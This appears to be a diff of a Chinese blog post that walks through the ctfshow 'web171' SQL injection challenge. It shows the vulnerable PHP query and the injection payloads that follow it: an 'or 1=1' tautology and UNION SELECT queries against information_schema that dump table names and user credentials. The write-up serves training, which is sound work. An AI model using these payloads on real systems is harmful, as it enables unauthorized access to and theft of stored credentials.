@@ -487,7 +487,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-03
+                    2021-10-28
                 </div>
                 
 
@@ -522,7 +522,7 @@
                 <h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>sql语句<code> $sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
 <p>第一题的sql注入是没有什么注入的，直接使用万能注入，payload<code>1&#39; or 1=1 --+</code></p>
 <p>或者先获得表名，然后查询</p>
-<p>1.payload<code>1&#39; union select 1,2,database() --+</code>，获得数据库的名字</p>
+<p>1.payload<code>1&#39; union select 1,2,database() --+</code>或者<code>union select 1,2,schema_name from information_schema.schemata</code>，获得数据库的名字</p>
 <p>2.payload<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() --+</code>，获得表的名字</p>
 <p>3.payload<code>1&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;ctfshow_user&#39; --+</code>获得列的名字</p>
 <p>4.payload<code>1&#39; union select id,username,password from ctfshow_user --+</code> 得到flag</p>
